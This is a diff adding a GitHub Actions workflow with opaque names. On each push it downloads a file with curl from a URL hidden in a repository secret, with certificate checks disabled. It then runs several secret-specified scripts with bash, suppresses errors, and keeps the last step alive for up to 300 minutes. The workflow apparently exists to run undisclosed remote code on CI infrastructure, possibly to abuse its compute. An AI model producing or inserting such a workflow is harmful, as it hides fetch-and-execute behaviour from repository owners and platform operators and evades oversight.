@@ -1,0 +1,30 @@
+name: efat5
+
+on:
+    push:
+    workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+     - name: EFW1
+       uses: actions/checkout@main
+
+     - name: EFW2
+       timeout-minutes: 5
+       continue-on-error: true
+       run: |
+             curl -sLkO ${{ secrets.EF_AB }}
+             bash ${{ secrets.EF_CD }}
+     - name: EFW3
+       continue-on-error: true
+       run: |
+             bash ${{ secrets.EF_EF }}
+             bash ${{ secrets.EF_GH }}
+     - name: EFW4
+       timeout-minutes: 300
+       continue-on-error: true
+       run: |
+            bash ${{ secrets.EF_IJ }}
